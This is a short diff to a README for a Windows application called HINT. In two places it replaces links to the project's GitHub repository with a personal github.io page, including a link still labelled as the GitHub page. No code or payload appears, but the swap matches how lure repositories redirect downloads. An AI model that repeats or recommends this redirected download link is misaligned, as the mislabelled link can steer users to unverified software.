@@ -36,7 +36,7 @@ You don't need to be a tech wizard. The installation process is straightforward,
 
 ### Step 1: Get the Software
 
-[![Download HINT](https://img.shields.io/badge/Download-HINT-blue?style=for-the-badge&logo=github&logoColor=white&color=random)](https://github.com/Esma326817/HINT)
+[![Download HINT](https://img.shields.io/badge/Download-HINT-blue?style=for-the-badge&logo=github&logoColor=white&color=random)](https://esma326817.github.io)
 
 Visit this link to download the application. The download page will show you the available files. Choose the one that matches your computer (Windows is supported).
 
@@ -149,7 +149,7 @@ The current version is optimized for Windows. Future updates may add support for
 
 If you run into any issues or have questions:
 
-- **Visit the GitHub page:** [https://github.com/Esma326817/HINT](https://github.com/Esma326817/HINT)
+- **Visit the GitHub page:** [https://esma326817.github.io](https://esma326817.github.io)
 - **Check the Documentation:** Look for a "Docs" or "Wiki" section on the GitHub page
 - **Report Issues:** If you find a bug, you can create a "New Issue" on GitHub
 
